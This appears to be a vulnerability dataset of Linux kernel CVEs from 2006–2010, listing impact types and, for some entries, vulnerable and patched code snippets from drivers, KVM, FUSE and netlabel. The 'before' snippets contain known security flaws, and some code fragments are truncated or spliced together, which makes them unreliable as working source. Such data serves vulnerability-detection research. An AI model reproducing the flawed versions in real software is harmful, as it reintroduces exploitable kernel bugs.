 /*  Copy arguments into temp kernel buffer  */
 switch (_IOC_DIR(cmd)) {
 case _IOC_NONE:
		parg = NULL;
 break;
 case _IOC_READ:
 case _IOC_WRITE:
 case (_IOC_WRITE | _IOC_READ):
 if (_IOC_SIZE(cmd) <= sizeof(sbuf)) {
			parg = sbuf;
		} else {
 /* too big to allocate from stack */
			mbuf = kmalloc(_IOC_SIZE(cmd), GFP_KERNEL);
 if (NULL == mbuf)
 return -ENOMEM;
			parg = mbuf;
		}

		err = -EFAULT;
 if (_IOC_DIR(cmd) & _IOC_WRITE)
 if (copy_from_user(parg, (void __user *)arg, _IOC_SIZE(cmd)))
 goto out;
 break;
	}
 if (is_ext_ctrl) {
 struct v4l2_ext_controls *p = parg;

 /* In case of an error, tell the caller that it wasn't
		   a specific control that caused it. */
		p->error_idx = p->count;
		user_ptr = (void __user *)p->controls;
 if (p->count) {
			ctrls_size = sizeof(struct v4l2_ext_control) * p->count;
 /* Note: v4l2_ext_controls fits in sbuf[] so mbuf is still NULL. */
			mbuf = kmalloc(ctrls_size, GFP_KERNEL);
			err = -ENOMEM;
 if (NULL == mbuf)
 goto out_ext_ctrl;
			err = -EFAULT;
 if (copy_from_user(mbuf, user_ptr, ctrls_size))
 goto out_ext_ctrl;
			p->controls = mbuf;
		}
	}

 /* call driver */
	err = func(file, cmd, parg);
 if (err == -ENOIOCTLCMD)
		err = -EINVAL;
 if (is_ext_ctrl) {
 struct v4l2_ext_controls *p = parg;

		p->controls = (void *)user_ptr;
 if (p->count && err == 0 && copy_to_user(user_ptr, mbuf, ctrls_size))
			err = -EFAULT;
 goto out_ext_ctrl;
	}
 if (err < 0)
 goto out;

out_ext_ctrl:
 /*  Copy results into user buffer  */
 switch (_IOC_DIR(cmd)) {
 case _IOC_READ:
 case (_IOC_WRITE | _IOC_READ):
 if (copy_to_user((void __user *)arg, parg, _IOC_SIZE(cmd)))
			err = -EFAULT;
 break;
	}

out:
 kfree(mbuf);
 return err;
}
EXPORT_SYMBOL(video_usercopy);

static void dbgbuf(unsigned int cmd, struct video_device *vfd,
 struct v4l2_buffer *p)
{
 return ret;
}

long video_ioctl2(struct file *file,
 unsigned int cmd, unsigned long arg)

{
 char	sbuf[128];
 void    *mbuf = NULL;
	}

 /* Handles IOCTL */
	err = __video_do_ioctl(file, cmd, parg);
 if (err == -ENOIOCTLCMD)
		err = -EINVAL;

 kfree(mbuf);
 return err;
}







EXPORT_SYMBOL(video_ioctl2);
","}
EXPORT_SYMBOL(v4l_printk_ioctl);
































































































static void dbgbuf(unsigned int cmd, struct video_device *vfd,
 struct v4l2_buffer *p)
{
 return ret;
}

long
video_usercopy(struct file *file, unsigned int cmd, unsigned long arg,
	       v4l2_kioctl func)
{
 char	sbuf[128];
 void    *mbuf = NULL;
	}

 /* Handles IOCTL */
	err = func(file, cmd, parg);
 if (err == -ENOIOCTLCMD)
		err = -EINVAL;

 kfree(mbuf);
 return err;
}
EXPORT_SYMBOL(video_usercopy);

long video_ioctl2(struct file *file,
 unsigned int cmd, unsigned long arg)
{
 return video_usercopy(file, cmd, arg, __video_do_ioctl);
}
EXPORT_SYMBOL(video_ioctl2);
"
2017,DoS ,CVE-2010-5328,"		[PIDTYPE_PGID] = INIT_PID_LINK(PIDTYPE_PGID),		\
		[PIDTYPE_SID]  = INIT_PID_LINK(PIDTYPE_SID),		\
	},								\

	.dirties = INIT_PROP_LOCAL_SINGLE(dirties),			\
	INIT_IDS							\
 INIT_PERF_EVENTS(tsk)						\
","		[PIDTYPE_PGID] = INIT_PID_LINK(PIDTYPE_PGID),		\
		[PIDTYPE_SID]  = INIT_PID_LINK(PIDTYPE_SID),		\
	},								\
	.thread_group	= LIST_HEAD_INIT(tsk.thread_group),		\
	.dirties = INIT_PROP_LOCAL_SINGLE(dirties),			\
	INIT_IDS							\
 INIT_PERF_EVENTS(tsk)						\
"
2017,DoS ,CVE-2010-5321,,
2014,DoS ,CVE-2010-5313,"
static int handle_emulation_failure(struct kvm_vcpu *vcpu)
{


	++vcpu->stat.insn_emulation_fail;
 trace_kvm_emulate_insn_failed(vcpu);
	vcpu->run->exit_reason = KVM_EXIT_INTERNAL_ERROR;
	vcpu->run->internal.suberror = KVM_INTERNAL_ERROR_EMULATION;
	vcpu->run->internal.ndata = 0;



 kvm_queue_exception(vcpu, UD_VECTOR);
 return EMULATE_FAIL;

}

static bool reexecute_instruction(struct kvm_vcpu *vcpu, gva_t gva)
","
static int handle_emulation_failure(struct kvm_vcpu *vcpu)
{
 int r = EMULATE_DONE;

	++vcpu->stat.insn_emulation_fail;
 trace_kvm_emulate_insn_failed(vcpu);
 if (!is_guest_mode(vcpu)) {
		vcpu->run->exit_reason = KVM_EXIT_INTERNAL_ERROR;
		vcpu->run->internal.suberror = KVM_INTERNAL_ERROR_EMULATION;
		vcpu->run->internal.ndata = 0;
		r = EMULATE_FAIL;
	}
 kvm_queue_exception(vcpu, UD_VECTOR);

 return r;
}

static bool reexecute_instruction(struct kvm_vcpu *vcpu, gva_t gva)
"
2011,DoS ,CVE-2010-4805,,
2011,DoS ,CVE-2010-4668,,
2011,DoS Overflow +Priv ,CVE-2010-4656,,
2011,#NAME?,CVE-2010-4655,,
2012,DoS Overflow ,CVE-2010-4650," return 0;
}















/*
 * For ioctls, there is no generic way to determine how much memory
 * needs to be read and/or written.  Furthermore, ioctls are allowed
		in_iov = page_address(iov_page);
		out_iov = in_iov + in_iovs;









 goto retry;
	}

"," return 0;
}

/* Make sure iov_length() won't overflow */
static int fuse_verify_ioctl_iov(struct iovec *iov, size_t count)
{
 size_t n;
	u32 max = FUSE_MAX_PAGES_PER_REQ << PAGE_SHIFT;

 for (n = 0; n < count; n++) {
 if (iov->iov_len > (size_t) max)
 return -ENOMEM;
		max -= iov->iov_len;
	}
 return 0;
}

/*
 * For ioctls, there is no generic way to determine how much memory
 * needs to be read and/or written.  Furthermore, ioctls are allowed
		in_iov = page_address(iov_page);
		out_iov = in_iov + in_iovs;

		err = fuse_verify_ioctl_iov(in_iov, in_iovs);
 if (err)
 goto out;

		err = fuse_verify_ioctl_iov(out_iov, out_iovs);
 if (err)
 goto out;

 goto retry;
	}

"
2011,DoS Overflow Mem. Corr. ,CVE-2010-4649,,
2012,,CVE-2010-4648," */
 if (param->value) {
			priv->tkip_cm_active = 1;
			ret = hermes_enable_port(hw, 0);
		} else {
			priv->tkip_cm_active = 0;
			ret = hermes_disable_port(hw, 0);
		}
 break;

"," */
 if (param->value) {
			priv->tkip_cm_active = 1;
			ret = hermes_disable_port(hw, 0);
		} else {
			priv->tkip_cm_active = 0;
			ret = hermes_enable_port(hw, 0);
		}
 break;

"
2010,#NAME?,CVE-2010-4565,,
2012,#NAME?,CVE-2010-4563,,
2011,#NAME?,CVE-2010-4529,,
2011,Overflow +Priv +Info ,CVE-2010-4527,,
2011,DoS ,CVE-2010-4526,,
2011,#NAME?,CVE-2010-4525,,
2010,#NAME?,CVE-2010-4347,,
2010,Bypass ,CVE-2010-4346,,
2010,DoS ,CVE-2010-4343,,
2010,DoS ,CVE-2010-4342,,
2011,DoS ,CVE-2010-4263,,
2010,#NAME?,CVE-2010-4258,,
2011,DoS ,CVE-2010-4256,,
2011,DoS ,CVE-2010-4251,,
2012,DoS ,CVE-2010-4250," if (ret >= 0)
 return ret;


 atomic_dec(&user->inotify_devs);
out_free_uid:
 free_uid(user);
"," if (ret >= 0)
 return ret;

 fsnotify_put_group(group);
 atomic_dec(&user->inotify_devs);
out_free_uid:
 free_uid(user);
"
2010,DoS ,CVE-2010-4249,,
2010,DoS ,CVE-2010-4248,,
2011,DoS ,CVE-2010-4243,,
2011,DoS ,CVE-2010-4242,,
2011,DoS Overflow Mem. Corr. ,CVE-2010-4175,,
2010,DoS ,CVE-2010-4169,,
2010,DoS ,CVE-2010-4165,,
2011,DoS ,CVE-2010-4164,,
2011,DoS ,CVE-2010-4163,,
2011,DoS Overflow ,CVE-2010-4162,,
2011,DoS Overflow +Priv Mem. Corr. ,CVE-2010-4160,,
2010,#NAME?,CVE-2010-4158,,
2010,DoS Overflow Mem. Corr. ,CVE-2010-4157,,
2010,#NAME?,CVE-2010-4083,,
2010,#NAME?,CVE-2010-4082,,
2010,#NAME?,CVE-2010-4081,,
2010,#NAME?,CVE-2010-4080,,
2010,#NAME?,CVE-2010-4079,,
2010,#NAME?,CVE-2010-4078,,
2010,#NAME?,CVE-2010-4077,,
2010,#NAME?,CVE-2010-4076,,
2010,#NAME?,CVE-2010-4075,,
2010,#NAME?,CVE-2010-4074,,
2010,#NAME?,CVE-2010-4073,,
2010,#NAME?,CVE-2010-4072,,
2010,#NAME?,CVE-2010-3904,,
2010,#NAME?,CVE-2010-3881,,
2010,DoS ,CVE-2010-3880,,
2011,#NAME?,CVE-2010-3877,,
2011,#NAME?,CVE-2010-3876,,
2011,#NAME?,CVE-2010-3875,,
2010,DoS Overflow Mem. Corr. ,CVE-2010-3874,,
2011,DoS Overflow Mem. Corr. ,CVE-2010-3873,,
2011,DoS Exec Code Overflow ,CVE-2010-3865,,
2010,#NAME?,CVE-2010-3861,,
2010,Overflow +Priv ,CVE-2010-3859,,
2010,DoS ,CVE-2010-3858,,
2010,Bypass ,CVE-2010-3850,,
2010,DoS ,CVE-2010-3849,,
2010,Overflow +Priv ,CVE-2010-3848,,
2010,DoS Mem. Corr. ,CVE-2010-3705,,
2010,DoS ,CVE-2010-3698,,
2010,#NAME?,CVE-2010-3477,,
2011,DoS ,CVE-2010-3448,,
2010,DoS Overflow Mem. Corr. ,CVE-2010-3442,,
2010,DoS +Info ,CVE-2010-3437,,
2010,DoS ,CVE-2010-3432,,
2010,DoS Mem. Corr. ,CVE-2010-3310,,
2010,#NAME?,CVE-2010-3301,,
2010,#NAME?,CVE-2010-3298,,
2010,#NAME?,CVE-2010-3297,,
2010,#NAME?,CVE-2010-3296,,
2011,DoS ,CVE-2010-3086,,
2010,DoS Overflow ,CVE-2010-3084,,
2010,Overflow +Priv ,CVE-2010-3081,,
2010,DoS ,CVE-2010-3080,,
2010,DoS ,CVE-2010-3079,,
2010,#NAME?,CVE-2010-3078,,
2010,DoS Overflow ,CVE-2010-3067,,
2010,DoS ,CVE-2010-3066,,
2010,DoS Overflow ,CVE-2010-3015,,
2010,#NAME?,CVE-2010-2963,,
2010,#NAME?,CVE-2010-2962,,
2010,DoS ,CVE-2010-2960,,
2010,DoS Exec Code Overflow ,CVE-2010-2959,,
2010,#NAME?,CVE-2010-2955,,
2010,DoS ,CVE-2010-2954,,
2010,Bypass ,CVE-2010-2946,,
2010,#NAME?,CVE-2010-2943,,
2010,#NAME?,CVE-2010-2942,,
2010,#NAME?,CVE-2010-2803,,
2010,DoS ,CVE-2010-2798,,
2010,DoS ,CVE-2010-2653,,
2010,Overflow +Info ,CVE-2010-2538,,
2010,,CVE-2010-2537,,
2021,#NAME?,CVE-2010-2525,,
2010,,CVE-2010-2524,,
2010,DoS Exec Code Overflow ,CVE-2010-2521,,
2010,DoS ,CVE-2010-2495,,
2010,DoS Overflow +Priv ,CVE-2010-2492,,
2010,DoS Overflow ,CVE-2010-2478,,
2010,DoS ,CVE-2010-2248,,
2019,,CVE-2010-2243,,
2010,Exec Code ,CVE-2010-2240,,
2010,#NAME?,CVE-2010-2226,,
2010,Bypass ,CVE-2010-2071,,
2010,,CVE-2010-2066,,
2010,DoS ,CVE-2010-1643,,
2010,Bypass ,CVE-2010-1641,,
2010,#NAME?,CVE-2010-1636,,
2010,DoS ,CVE-2010-1488,,
2010,Overflow ,CVE-2010-1451,,
2010,,CVE-2010-1446,,
2010,DoS Mem. Corr. ,CVE-2010-1437,,
2010,DoS ,CVE-2010-1436,,
2010,DoS ,CVE-2010-1188,,
2010,DoS ,CVE-2010-1187,,
2010,DoS ,CVE-2010-1173,,
2010,,CVE-2010-1162,,
2010,DoS ,CVE-2010-1148,,
2010,#NAME?,CVE-2010-1146,,
2010,,CVE-2010-1088,,
2010,DoS ,CVE-2010-1087,,
2010,DoS ,CVE-2010-1086,,
2010,DoS ,CVE-2010-1085,,
2010,DoS Overflow Mem. Corr. ,CVE-2010-1084,,
2010,#NAME?,CVE-2010-1083,,
2010,DoS ,CVE-2010-0727,,
2010,DoS ,CVE-2010-0623,,
2010,DoS ,CVE-2010-0622,,
2010,DoS ,CVE-2010-0437,,
2010,DoS ,CVE-2010-0415,,
2010,DoS ,CVE-2010-0410,,
2010,DoS ,CVE-2010-0307,,
2010,DoS +Priv ,CVE-2010-0298,,
2010,DoS +Priv ,CVE-2010-0291,,
2010,DoS ,CVE-2010-0008,,
2010,Bypass ,CVE-2010-0007,,
2010,DoS ,CVE-2010-0006,,
2010,DoS +Info ,CVE-2010-0003,,
2010,DoS ,CVE-2009-4895,,
2010,,CVE-2009-4538,,
2010,DoS ,CVE-2009-4537,,
2010,Bypass ,CVE-2009-4536,,
2009,DoS ,CVE-2009-4410,,
2009,DoS ,CVE-2009-4308,,
2009,DoS ,CVE-2009-4307,,
2009,DoS ,CVE-2009-4306,,
2010,DoS ,CVE-2009-4271,,
2010,#NAME?,CVE-2009-4141,,
2009,DoS ,CVE-2009-4138,,
2009,,CVE-2009-4131,,
2020,DoS Exec Code Overflow ,CVE-2009-4067,,
2009,DoS ,CVE-2009-4031,,
2009,DoS ,CVE-2009-4027,,
2009,DoS ,CVE-2009-4026,,
2009,DoS ,CVE-2009-4021,,
2009,Overflow ,CVE-2009-4020,,
2009,Overflow ,CVE-2009-4005,,
2009,DoS Overflow +Priv Mem. Corr. ,CVE-2009-4004,,
2009,,CVE-2009-3939,,
2009,,CVE-2009-3889,,
2009,DoS ,CVE-2009-3888,,
2009,DoS ,CVE-2009-3726,,
2009,#NAME?,CVE-2009-3725,,
2009,DoS ,CVE-2009-3722,,
2009,DoS +Priv ,CVE-2009-3640,,
2009,Overflow ,CVE-2009-3638,,
2009,DoS +Priv ,CVE-2009-3624,,
2009,DoS ,CVE-2009-3623,,
2009,DoS ,CVE-2009-3621,,
2009,DoS +Priv ,CVE-2009-3620,,
2009,DoS ,CVE-2009-3613,,
2009,#NAME?,CVE-2009-3612,,
2009,DoS +Priv ,CVE-2009-3547,,
2009,DoS ,CVE-2009-3290,,
2009,DoS Overflow ,CVE-2009-3288,,
2009,#NAME?,CVE-2009-3286,,
2009,DoS Overflow ,CVE-2009-3280,,
2009,,CVE-2009-3238,,
2009,DoS Exec Code Overflow ,CVE-2009-3234,,
2009,#NAME?,CVE-2009-3228,,
2009,DoS +Priv ,CVE-2009-3080,,
2009,DoS +Priv ,CVE-2009-3043,,
2009,#NAME?,CVE-2009-3002,,
2009,#NAME?,CVE-2009-3001,,
2009,#NAME?,CVE-2009-2910,,
2009,DoS ,CVE-2009-2909,,
2009,DoS Exec Code ,CVE-2009-2908,,
2009,DoS ,CVE-2009-2903,,
2009,DoS ,CVE-2009-2849,,
2009,DoS +Priv Mem. Corr. ,CVE-2009-2848,,
2009,Bypass ,CVE-2009-2846,,
2009,DoS ,CVE-2009-2844,,
2009,DoS ,CVE-2009-2768,,
2009,DoS Overflow +Priv ,CVE-2009-2767,,
2009,DoS +Priv ,CVE-2009-2698,,
2009,Overflow +Priv ,CVE-2009-2695,,
2009,Overflow +Priv ,CVE-2009-2692,,
2009,#NAME?,CVE-2009-2691,,
2009,Overflow +Priv ,CVE-2009-2584,,
2009,DoS Overflow +Priv ,CVE-2009-2407,,
2009,DoS Overflow +Priv ,CVE-2009-2406,,
2009,DoS ,CVE-2009-2287,,
2009,DoS ,CVE-2009-1961,,
2009,DoS ,CVE-2009-1914,,
2009,Overflow +Priv ,CVE-2009-1897,,
2009,Bypass ,CVE-2009-1895,,
2009,,CVE-2009-1883,,
2009,DoS Overflow Mem. Corr. ,CVE-2009-1633,,
2009,Bypass ,CVE-2009-1630,,
2009,#NAME?,CVE-2009-1527,,
2009,DoS Overflow ,CVE-2009-1439,,
2009,DoS Overflow Mem. Corr. ,CVE-2009-1389,,
2009,DoS ,CVE-2009-1388,,
2009,DoS ,CVE-2009-1385,,
2009,DoS ,CVE-2009-1360,,
2009,Bypass ,CVE-2009-1338,,
2009,,CVE-2009-1337,,
2009,DoS ,CVE-2009-1336,,
2009,DoS Overflow ,CVE-2009-1298,,
2009,Overflow +Info ,CVE-2009-1265,,
2009,DoS ,CVE-2009-1243,,
2009,DoS ,CVE-2009-1242,,
2009,#NAME?,CVE-2009-1192,,
2009,Bypass ,CVE-2009-1184,,
2009,,CVE-2009-1072,,
2009,DoS Mem. Corr. ,CVE-2009-1046,,
2009,DoS ,CVE-2009-0935,,
2009,DoS ,CVE-2009-0859,,
2009,Bypass ,CVE-2009-0835,,
2009,Bypass ,CVE-2009-0834,,
2009,,CVE-2009-0787,,
2009,DoS ,CVE-2009-0778,,
2009,DoS ,CVE-2009-0748,,
2009,DoS ,CVE-2009-0747,,
2009,DoS ,CVE-2009-0746,,
2009,DoS ,CVE-2009-0745,,
2009,#NAME?,CVE-2009-0676,,
2009,,CVE-2009-0675,,
2009,DoS Overflow +Priv Mem. Corr. ,CVE-2009-0605,,
2009,DoS ,CVE-2009-0322,,
2009,DoS Mem. Corr. ,CVE-2009-0269,,
2009,Overflow ,CVE-2009-0065,,
2009,DoS ,CVE-2009-0031,,
2009,DoS +Priv ,CVE-2009-0029,,
2009,,CVE-2009-0028,,
2009,DoS +Priv ,CVE-2009-0024,,
2016,DoS ,CVE-2008-7316," const struct iovec *iov = i->iov;
 size_t base = i->iov_offset;

 while (bytes) {




 int copy = min(bytes, iov->iov_len - base);

			bytes -= copy;

 cond_resched();


 if (unlikely(copied == 0)) {
 /*
			 * If we were unable to copy any data at all, we must
 iov_iter_single_seg_count(i));
 goto again;
		}
 iov_iter_advance(i, copied);
		pos += copied;
		written += copied;

"," const struct iovec *iov = i->iov;
 size_t base = i->iov_offset;

 /*
		 * The !iov->iov_len check ensures we skip over unlikely
		 * zero-length segments.
 */
 while (bytes || !iov->iov_len) {
 int copy = min(bytes, iov->iov_len - base);

			bytes -= copy;

 cond_resched();

 iov_iter_advance(i, copied);
 if (unlikely(copied == 0)) {
 /*
			 * If we were unable to copy any data at all, we must
 iov_iter_single_seg_count(i));
 goto again;
		}

		pos += copied;
		written += copied;

"
2009,DoS ,CVE-2008-6107,,
2008,DoS ,CVE-2008-5713,,
2008,Overflow ,CVE-2008-5702,,
2008,DoS ,CVE-2008-5701,,
2008,DoS ,CVE-2008-5700,,
2008,DoS ,CVE-2008-5300,,
2008,#NAME?,CVE-2008-5182,,
2008,Overflow ,CVE-2008-5134,,
2008,DoS ,CVE-2008-5079,,
2008,DoS ,CVE-2008-5033,,
2008,DoS ,CVE-2008-5029,,
2008,DoS Overflow Mem. Corr. ,CVE-2008-5025,,
2008,DoS ,CVE-2008-4934,,
2008,DoS Overflow Mem. Corr. ,CVE-2008-4933,,
2008,DoS ,CVE-2008-4618,,
2008,DoS ,CVE-2008-4609,,
2008,DoS ,CVE-2008-4576,,
2008,Bypass ,CVE-2008-4554,,
2008,#NAME?,CVE-2008-4445,,
2008,DoS ,CVE-2008-4410,,
2008,Exec Code Overflow ,CVE-2008-4395,,
2009,DoS ,CVE-2008-4307,,
2008,DoS ,CVE-2008-4302,,
2008,#NAME?,CVE-2008-4210,,
2008,#NAME?,CVE-2008-4113,,
2008,Overflow ,CVE-2008-3915,,
2008,Overflow ,CVE-2008-3911,,
2008,#NAME?,CVE-2008-3833,,
2008,DoS ,CVE-2008-3792,,
2008,DoS ,CVE-2008-3686,,
2008,DoS ,CVE-2008-3535,,
2008,DoS ,CVE-2008-3534,,
2008,DoS ,CVE-2008-3528,,
2008,DoS +Priv ,CVE-2008-3527,,
2008,DoS Overflow ,CVE-2008-3526,,
2008,Bypass ,CVE-2008-3525,,
2008,Overflow ,CVE-2008-3496,,
2008,DoS Overflow ,CVE-2008-3276,,
2008,DoS Overflow ,CVE-2008-3275,,
2008,#NAME?,CVE-2008-3272,,
2008,DoS Overflow +Priv ,CVE-2008-3247,,
2008,DoS ,CVE-2008-3077,,
2008,DoS ,CVE-2008-2944,,
2008,DoS +Priv ,CVE-2008-2931,,
2008,DoS Overflow ,CVE-2008-2826,,
2008,DoS +Priv ,CVE-2008-2812,,
2008,DoS Mem. Corr. ,CVE-2008-2750,,
2008,#NAME?,CVE-2008-2729,,
2021,Bypass ,CVE-2008-2544,,
2008,DoS ,CVE-2008-2372,,
2008,DoS ,CVE-2008-2365,,
2008,Overflow +Priv ,CVE-2008-2358,,
2008,DoS ,CVE-2008-2148,,
2008,DoS ,CVE-2008-2137,,
2008,DoS ,CVE-2008-2136,,
2008,,CVE-2008-1675,,
2008,DoS Exec Code Overflow ,CVE-2008-1673,,
2008,Exec Code ,CVE-2008-1669,,
2008,DoS ,CVE-2008-1514,,
2008,DoS +Priv ,CVE-2008-1375,,
2008,Bypass ,CVE-2008-1294,,
2008,#NAME?,CVE-2008-0600,,
2008,#NAME?,CVE-2008-0598,,
2008,DoS Overflow ,CVE-2008-0352,,
2008,,CVE-2008-0163,,
2008,,CVE-2008-0010,,
2008,,CVE-2008-0009,,
2008,,CVE-2008-0007,,
2008,Bypass ,CVE-2008-0001,,
2019,Overflow ,CVE-2007-6762,"
 nla_for_each_nested(nla, info->attrs[NLBL_CIPSOV4_A_TAGLST], nla_rem)
 if (nla->nla_type == NLBL_CIPSOV4_A_TAG) {
 if (iter > CIPSO_V4_TAG_MAXCNT)
 return -EINVAL;
			doi_def->tags[iter++] = nla_get_u8(nla);
		}
 if (iter < CIPSO_V4_TAG_MAXCNT)
		doi_def->tags[iter] = CIPSO_V4_TAG_INVALID;

 return 0;
}
","
 nla_for_each_nested(nla, info->attrs[NLBL_CIPSOV4_A_TAGLST], nla_rem)
 if (nla->nla_type == NLBL_CIPSOV4_A_TAG) {
 if (iter >= CIPSO_V4_TAG_MAXCNT)
 return -EINVAL;
			doi_def->tags[iter++] = nla_get_u8(nla);
		}
 while (iter < CIPSO_V4_TAG_MAXCNT)
		doi_def->tags[iter++] = CIPSO_V4_TAG_INVALID;

 return 0;
}
"
2017,Overflow ,CVE-2007-6761,"{
 struct videobuf_mapping *map = vma->vm_private_data;

 dprintk(2,""vm_open %p [count=%d,vma=%08lx-%08lx]\n"",map,
		map->count,vma->vm_start,vma->vm_end);

	map->count++;
 struct videobuf_queue *q = map->q;
 int i;

 dprintk(2,""vm_close %p [count=%d,vma=%08lx-%08lx]\n"",map,
		map->count,vma->vm_start,vma->vm_end);

	map->count--;
	}

 /* create mapping + update buffer list */
	map = q->bufs[first]->map = kmalloc(sizeof(struct videobuf_mapping),GFP_KERNEL);
 if (NULL == map)
 return -ENOMEM;

","{
 struct videobuf_mapping *map = vma->vm_private_data;

 dprintk(2,""vm_open %p [count=%u,vma=%08lx-%08lx]\n"",map,
		map->count,vma->vm_start,vma->vm_end);

	map->count++;
 struct videobuf_queue *q = map->q;
 int i;

 dprintk(2,""vm_close %p [count=%u,vma=%08lx-%08lx]\n"",map,
		map->count,vma->vm_start,vma->vm_end);

	map->count--;
	}

 /* create mapping + update buffer list */
	map = q->bufs[first]->map = kzalloc(sizeof(struct videobuf_mapping),GFP_KERNEL);
 if (NULL == map)
 return -ENOMEM;

"
2010,DoS ,CVE-2007-6733,,
2008,DoS ,CVE-2007-6716,,
2007,Bypass ,CVE-2007-6434,,
2007,DoS +Info ,CVE-2007-6417,,
2007,#NAME?,CVE-2007-6206,,
2007,DoS Overflow ,CVE-2007-6151,,
2007,Overflow ,CVE-2007-6063,,
2007,DoS Exec Code Overflow ,CVE-2007-5966,,
2007,DoS Exec Code Overflow ,CVE-2007-5904,,
2007,DoS ,CVE-2007-5501,,
2007,DoS ,CVE-2007-5500,,
2008,DoS ,CVE-2007-5498,,
2007,DoS ,CVE-2007-5093,,
2007,DoS ,CVE-2007-5087,,
2008,,CVE-2007-4998,,
2007,DoS ,CVE-2007-4997,,
2020,Bypass ,CVE-2007-4774,,
2007,#NAME?,CVE-2007-4573,,
2007,#NAME?,CVE-2007-4571,,
2007,DoS ,CVE-2007-4567,,
2007,,CVE-2007-4311,,
2007,DoS ,CVE-2007-4133,,
2007,,CVE-2007-3848,,
2007,,CVE-2007-3843,,
2007,#NAME?,CVE-2007-3740,,
2019,,CVE-2007-3732,,
2007,DoS ,CVE-2007-3731,,
2007,DoS ,CVE-2007-3720,,
2007,DoS ,CVE-2007-3719,,
2007,DoS ,CVE-2007-3642,,
2007,DoS ,CVE-2007-3513,,
2007,DoS ,CVE-2007-3380,,
2007,DoS ,CVE-2007-3107,,
2007,DoS Overflow +Priv ,CVE-2007-3105,,
2007,DoS ,CVE-2007-2878,,
2007,DoS ,CVE-2007-2876,,
2007,,CVE-2007-2875,,
2007,DoS ,CVE-2007-2525,,
2007,,CVE-2007-2480,,
2007,,CVE-2007-2453,,
2007,#NAME?,CVE-2007-2451,,
2007,,CVE-2007-2172,,
2007,DoS Overflow ,CVE-2007-1861,,
2007,DoS ,CVE-2007-1734,,
2007,DoS ,CVE-2007-1730,,
2007,DoS Overflow ,CVE-2007-1592,,
2007,Bypass ,CVE-2007-1497,,
2007,DoS ,CVE-2007-1496,,
2007,DoS ,CVE-2007-1388,,
2007,DoS ,CVE-2007-1357,,
2007,#NAME?,CVE-2007-1353,,
2007,DoS Overflow +Priv ,CVE-2007-1217,,
2007,,CVE-2007-1000,,
2007,DoS +Priv +Info ,CVE-2007-0997,,
2007,,CVE-2007-0958,,
2007,#NAME?,CVE-2007-0822,,
2007,DoS ,CVE-2007-0772,,
2007,DoS ,CVE-2007-0771,,
2007,DoS ,CVE-2007-0006,,
2007,DoS ,CVE-2006-7203,,
2007,DoS Bypass ,CVE-2006-7051,,
2007,DoS ,CVE-2006-6921,,
2007,,CVE-2006-6535,,
2006,DoS Mem. Corr. ,CVE-2006-6333,,
2006,,CVE-2006-6304,,
2006,DoS Mem. Corr. ,CVE-2006-6128,,
2006,DoS Exec Code Overflow ,CVE-2006-6106,,
2006,DoS ,CVE-2006-6060,,
2006,DoS Overflow ,CVE-2006-6058,,
2006,DoS ,CVE-2006-6057,,
2006,DoS ,CVE-2006-6056,,
2006,DoS ,CVE-2006-6054,,
2006,DoS ,CVE-2006-6053,,
2006,,CVE-2006-5871,,
2006,DoS Mem. Corr. ,CVE-2006-5823,,
2006,DoS ,CVE-2006-5757,,
2006,DoS ,CVE-2006-5755,,
2007,DoS ,CVE-2006-5754,,
2007,DoS +Priv ,CVE-2006-5753,,
2006,Exec Code Overflow ,CVE-2006-5751,,
2006,,CVE-2006-5749,,
2006,DoS ,CVE-2006-5701,,
2006,DoS ,CVE-2006-5619,,
2017,DoS ,CVE-2006-5331,"
void altivec_unavailable_exception(struct pt_regs *regs)
{
#if !defined(CONFIG_ALTIVEC)
 if (user_mode(regs)) {
 /* A user program has executed an altivec instruction,
		   but this kernel doesn't support altivec. */
 _exception(SIGILL, regs, ILL_ILLOPC, regs->nip);
 return;
	}
#endif
 printk(KERN_EMERG ""Unrecoverable VMX/Altivec Unavailable Exception ""
 ""%lx at %lx\n"", regs->trap, regs->nip);
 die(""Unrecoverable VMX/Altivec Unavailable Exception"", regs, SIGABRT);
","
void altivec_unavailable_exception(struct pt_regs *regs)
{

 if (user_mode(regs)) {
 /* A user program has executed an altivec instruction,
		   but this kernel doesn't support altivec. */
 _exception(SIGILL, regs, ILL_ILLOPC, regs->nip);
 return;
	}

 printk(KERN_EMERG ""Unrecoverable VMX/Altivec Unavailable Exception ""
 ""%lx at %lx\n"", regs->trap, regs->nip);
 die(""Unrecoverable VMX/Altivec Unavailable Exception"", regs, SIGABRT);
"
2006,,CVE-2006-5174,,
2006,DoS ,CVE-2006-5173,,
2006,DoS ,CVE-2006-5158,,
2006,DoS ,CVE-2006-4997,,
2006,,CVE-2006-4814,,
2006,,CVE-2006-4813,,
2006,,CVE-2006-4663,,
2006,DoS ,CVE-2006-4623,,
2006,Bypass ,CVE-2006-4572,,
2006,DoS ,CVE-2006-4538,,
2006,DoS ,CVE-2006-4535,,
2006,DoS ,CVE-2006-4145,,
2006,DoS ,CVE-2006-4093,,
2006,DoS +Priv ,CVE-2006-3745,,
2006,DoS ,CVE-2006-3741,,
2017,DoS Overflow ,CVE-2006-3635,"	DBG_FAULT(15)
	FAULT(15)

	/*
	 * Squatting in this space ...
	 *
	 * This special case dispatcher for illegal operation faults allows preserved
	 * registers to be modified through a callback function (asm only) that is handed
	 * back from the fault handler in r8. Up to three arguments can be passed to the
	 * callback function by returning an aggregate with the callback as its first
	 * element, followed by the arguments.
	 */
ENTRY(dispatch_illegal_op_fault)
	.prologue
	.body
	SAVE_MIN_WITH_COVER
	ssm psr.ic | PSR_DEFAULT_BITS
	;;
	srlz.i		// guarantee that interruption collection is on
	;;
(p15)	ssm psr.i	// restore psr.i
	adds r3=8,r2	// set up second base pointer for SAVE_REST
	;;
	alloc r14=ar.pfs,0,0,1,0 // must be first in insn group
 mov out0=ar.ec
	;;
	SAVE_REST
	PT_REGS_UNWIND_INFO(0)
	;;
	br.call.sptk.many rp=ia64_illegal_op_fault
.ret0:	;;
	alloc r14=ar.pfs,0,0,3,0 // must be first in insn group
 mov out0=r9
 mov out1=r10
 mov out2=r11
 movl r15=ia64_leave_kernel
	;;
 mov rp=r15
 mov b6=r8
	;;
 cmp.ne p6,p0=0,r8
(p6)	br.call.dpnt.many b6=b6		// call returns to ia64_leave_kernel
	br.sptk.many ia64_leave_kernel
END(dispatch_illegal_op_fault)

 .org ia64_ivt+0x4000
/////////////////////////////////////////////////////////////////////////////////////////
// 0x4000 Entry 16 (size 64 bundles) Reserved
	DBG_FAULT(67)
	FAULT(67)











































#ifdef CONFIG_IA32_SUPPORT

	/*
#define ACCOUNT_SYS_ENTER
#endif




/*
